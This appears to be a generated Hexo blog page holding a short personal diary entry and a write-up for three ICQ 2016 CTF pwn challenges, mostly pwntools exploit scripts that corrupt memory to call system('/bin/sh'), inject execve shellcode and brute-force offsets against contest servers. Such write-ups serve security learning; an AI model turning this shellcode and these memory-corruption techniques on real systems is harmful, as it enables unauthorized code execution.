@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="http://yoursite.com">
+  <title>杂记-2016-7-18 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前记这阵子发生了太多事情了，刚打完的ICQ的pwn部分都没来及上传，就匆匆的回到了警校进行节奏紧凑的训练。说实话，这次训练的体能真的不是我的强项，每次体能训练完了就像具尸体一样，不过那样又如何？我本就不是一个轻易服输的人。">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="杂记-2016-7-18">
+<meta property="og:url" content="http://yoursite.com/2016/07/18/杂记-2016-7-18/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前记这阵子发生了太多事情了，刚打完的ICQ的pwn部分都没来及上传，就匆匆的回到了警校进行节奏紧凑的训练。说实话，这次训练的体能真的不是我的强项，每次体能训练完了就像具尸体一样，不过那样又如何？我本就不是一个轻易服输的人。">
+<meta property="og:updated_time" content="2016-12-20T02:34:51.464Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="杂记-2016-7-18">
+<meta name="twitter:description" content="前记这阵子发生了太多事情了，刚打完的ICQ的pwn部分都没来及上传，就匆匆的回到了警校进行节奏紧凑的训练。说实话，这次训练的体能真的不是我的强项，每次体能训练完了就像具尸体一样，不过那样又如何？我本就不是一个轻易服输的人。">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/main.css?v=4.0.0">
+  
+
+  
+
+</head>
+
+<body>
+  <div id="container" q-class="show:isCtnShow">
+    <canvas id="anm-canvas" class="anm-canvas"></canvas>
+    <div class="left-col" q-class="show:isShow">
+      <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			<img src="https://avatars1.githubusercontent.com/u/12570968?v=3&amp;s=460" class="js-avatar">
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">John Doe</a></h1>
+		</hgroup>
+
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+				<li><a href="/archives">所有文章</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+	        
+    		
+    			
+    			<a data-idx="0" q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
+    			
+    			
+            
+    			
+    			<a data-idx="1" q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
+    			
+    			
+            
+    			
+    			<a data-idx="2" q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
+    			
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="github" target="_blank" href="https://github.com/Winter3un" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Winter3un/activities" title="zhihu"><i class="icon-zhihu"></i></a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"><i class="icon-sort"></i></div>
+  		<h1 class="header-author js-mobile-header hide">John Doe</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img src="https://avatars1.githubusercontent.com/u/12570968?v=3&amp;s=460" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">John Doe</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        
+		        	<li><a href="/archives/">所有文章</a></li>
+		        
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/Winter3un" title="github"><i class="icon-github"></i></a>
+			        
+						<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Winter3un/activities" title="zhihu"><i class="icon-zhihu"></i></a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div id="wrapper" class="body-wrap">
+        <div class="menu-l">
+          <div class="canvas-wrap">
+            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
+          </div>
+          <div id="js-content" class="content-ll">
+            <article id="post-杂记-2016-7-18" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      杂记-2016-7-18
+    </h1>
+  
+
+        <a href="/2016/07/18/杂记-2016-7-18/" class="archive-article-date">
+  	<time datetime="2016-07-19T05:45:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-07-18</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h3><p>这阵子发生了太多事情了，刚打完的ICQ的pwn部分都没来及上传，就匆匆的回到了警校进行节奏紧凑的训练。说实话，这次训练的体能真的不是我的强项，每次体能训练完了就像具尸体一样，不过那样又如何？我本就不是一个轻易服输的人。</p>
+ <a id="more"></a>
+<h3 id="ICQ2016-WP"><a href="#ICQ2016-WP" class="headerlink" title="ICQ2016-WP"></a>ICQ2016-WP</h3><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"></div><div class="line"><span class="comment"># p = process("./pwn1")</span></div><div class="line">p  = remote(<span class="string">"106.75.37.29"</span>,<span class="number">10000</span>)</div><div class="line">elf = ELF(<span class="string">"./pwn1"</span>)</div><div class="line">scanf_plt = elf.symbols[<span class="string">"__isoc99_scanf"</span>]</div><div class="line">system_plt = elf.symbols[<span class="string">"system"</span>]</div><div class="line"></div><div class="line"><span class="comment"># system_got</span></div><div class="line"><span class="comment">#0x0804857E</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(off,value)</span>:</span></div><div class="line">	p.recvuntil(<span class="string">"input index:"</span>)</div><div class="line">	p.sendline(str(off))</div><div class="line">	p.recvuntil(<span class="string">"value:"</span>)</div><div class="line">	p.sendline(str(value))</div><div class="line"></div><div class="line">	p.recvuntil(<span class="string">"input index:"</span>)</div><div class="line">	p.sendline(str(<span class="number">0x28</span><span class="number">-0xc</span>))</div><div class="line">	p.recvuntil(<span class="string">"value:"</span>)</div><div class="line">	p.sendline(<span class="string">"0"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(off,l)</span>:</span></div><div class="line">	i = <span class="number">0</span> </div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> l:</div><div class="line">		p1 = x &amp; <span class="number">0xff</span></div><div class="line">		p2 = (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span></div><div class="line">		p3 = (x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></div><div class="line">		p4 = (x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p1)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p2)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p3)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p4)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">	<span class="keyword">return</span> i</div><div class="line">l = [scanf_plt,<span class="number">0x080486ae</span>,<span class="number">0x080486ED</span>,<span class="number">0x804A028</span>,scanf_plt,<span class="number">0x080486ae</span>,<span class="number">0x080486ED</span>,<span class="number">0x804A02c</span>,system_plt,<span class="number">0x080486ae</span>,<span class="number">0x804A028</span>]</div><div class="line"><span class="comment">#system_plt,0x080486ae,0x804A028</span></div><div class="line"></div><div class="line">index = change(<span class="number">60</span>,l)</div><div class="line">p.recvuntil(<span class="string">"input index:"</span>)</div><div class="line">p.sendline(str(<span class="number">0x28</span><span class="number">-0xc</span>))</div><div class="line">p.recvuntil(<span class="string">"value:"</span>)</div><div class="line">p.sendline(<span class="string">"10"</span>)</div><div class="line">p.recvuntil(<span class="string">"Your Array:0 0 0 0 0 0 0 0 0 0 "</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x0804857E\nc")</span></div><div class="line">p.sendline(str(u32(<span class="string">"/bin"</span>)))</div><div class="line">p.sendline(str(u32(<span class="string">"/sh\0"</span>)))</div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment">#flag&#123;9587c60c6962efc66d5adc7d18ee5500&#125;</span></div></pre></td></tr></table></figure>
+<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>卡了一段时间，挺好玩的,exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"></div><div class="line"><span class="comment"># p = process("./pwn2")</span></div><div class="line">p = remote(<span class="string">"106.75.37.31"</span>,<span class="number">23333</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"ight!\n\n"</span>)</div><div class="line"></div><div class="line">op_add_mv = chr((<span class="number">0xD70</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line">op_exit = chr((<span class="number">0xD40</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line">op_sub = chr((<span class="number">0xB28</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line">op_mov_l = chr((<span class="number">0xD20</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">23</span>):</div><div class="line">	p.sendline(op_sub)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x2f</span>+<span class="number">2</span>):</div><div class="line">	p.sendline(op_add_mv)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">	p.sendline(op_sub)</div><div class="line"></div><div class="line">shellcode = <span class="string">"\x90"</span>*<span class="number">60</span>+<span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></div><div class="line"></div><div class="line">p.sendline(str(<span class="number">0x602080</span>+<span class="number">40</span>))</div><div class="line">p.sendline(str(<span class="number">0x602080</span>+<span class="number">40</span>))</div><div class="line">p.sendline(shellcode)</div><div class="line">p.sendline(op_mov_l)</div><div class="line">p.sendline(op_add_mv)</div><div class="line"></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400776\nc")</span></div><div class="line">p.sendline(op_exit)</div><div class="line">p.interactive()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#flag&#123;53ed43a93ec84fe99ddbd33d5acf5284&#125;</span></div></pre></td></tr></table></figure>
+<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>没做出来，本地没有调试环境，卒。。</p>
+<p>后面fuzz了一下，exp如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">shellcode1 = <span class="string">"\xff\xff\x10\x04\xab\x0f\x02\x24\x55\xf0\x46\x20\x66\x06\xff\x23\xc2\xf9\xec\x23\x66\x06\xbd\x23\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf\x9a\xf9\xbd\x23\x21\x20\x80\x01\x21\x28\xa0\x03\xcc\xcd\x44\x03/bin/sh\x00"</span></div><div class="line">shellcode2 = <span class="string">"\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span></div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			p = remote(<span class="string">"106.75.32.60"</span>,<span class="number">10000</span>)</div><div class="line">			p.recvuntil(<span class="string">"lp' for  help.\n"</span>)</div><div class="line">			p.sendline(<span class="string">"2057561479"</span>)</div><div class="line">			data = p.recvuntil(<span class="string">"\n"</span>)[<span class="number">-9</span>:<span class="number">-1</span>]</div><div class="line">			off = int(data,<span class="number">16</span>)</div><div class="line">			<span class="keyword">print</span> <span class="string">"shellcode_addr = "</span> +hex(off)</div><div class="line">			payload = <span class="string">"20160606 0"</span></div><div class="line">			payload += <span class="string">"\x00"</span>*(<span class="number">0x70</span>+y-len(shellcode2)-len(payload))+shellcode2+p32(off+<span class="number">29</span>+x)</div><div class="line">			<span class="comment"># payload += "\x00"*(0x74-len(shellcode2)-10)+shellcode+p32(off)</span></div><div class="line">			<span class="keyword">print</span>  y,x</div><div class="line">			p.sendline(payload)</div><div class="line">			p.interactive()</div><div class="line">		<span class="keyword">except</span>:</div><div class="line">			p.close()</div></pre></td></tr></table></figure>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这阵子可能真的没有时间去做二进制研究了。</p>
+<p>直视自己。</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2016/07/18/杂记-2016-7-18/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2016/07/05/ICHUNQIU2016-PWN/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          【ICQ2016】 writeup
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/07/19/C-S-WeChat/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">C/S-WeChat</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+
+
+
+          </div>
+        </div>
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2017 John Doe
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		mathjax: false,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false,
+		root: "/",
+		innerArchive: true
+	}
+</script>
+
+<script src="/./main.js?v=4.0.0"></script>
+
+
+    
+<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all" q-show="innerArchive">
+        <div class="search-wrap">
+          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
+          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
+          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
+        </div>
+        <div class="widget tagcloud search-tag">
+          <p class="search-tag-wording">tag:</p>
+          <label class="search-switch">
+            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
+          </label>
+          <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">pwn</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">AWD</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ARM</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">code</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Writeup</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">bctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">writeup</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">heap overflow</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">arm</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">bin</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">wargame</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">pwntools</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">fmt</a>
+              </li>
+            
+            <div class="clearfix"></div>
+          </ul>
+        </div>
+        <ul class="search-ul">
+          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
+            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            2、在根目录_config.yml里添加配置：
+<pre style="font-size: 12px;" q-show="jsonFail">
+  jsonContent:
+    meta: false
+    pages: false
+    posts:
+      title: true
+      date: true
+      path: true
+      text: true
+      raw: false
+      content: false
+      slug: false
+      updated: false
+      comments: false
+      link: false
+      permalink: false
+      excerpt: false
+      categories: false
+      tags: true
+</pre>
+          </p>
+          <li class="search-li" q-repeat="items" q-show="isShow">
+            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
+            <p class="search-time">
+              <i class="icon-calendar icon"></i>
+              <span q-text="date|dateformat"></span>
+            </p>
+            <p class="search-tag">
+              <i class="icon-price-tags icon"></i>
+              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
+            </p>
+          </li>
+        </ul>
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-friends" q-show="friends">
+  		
+        <ul class="search-ul">
+          
+            <li class="search-li">
+              <a href="http://o0xmuhe.me/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>MuHe</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="http://www.bertramc.cn/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>bertramc</a>
+            </li>
+          
+        </ul>
+  		
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-me" q-show="aboutme">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">曾实习于安恒、桐乡市公安局反欺诈中心、Mirage队长、CTF玩家、网络安全研究员、pwner、半赛棍、浙警院13级学生</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+</body>
+</html>
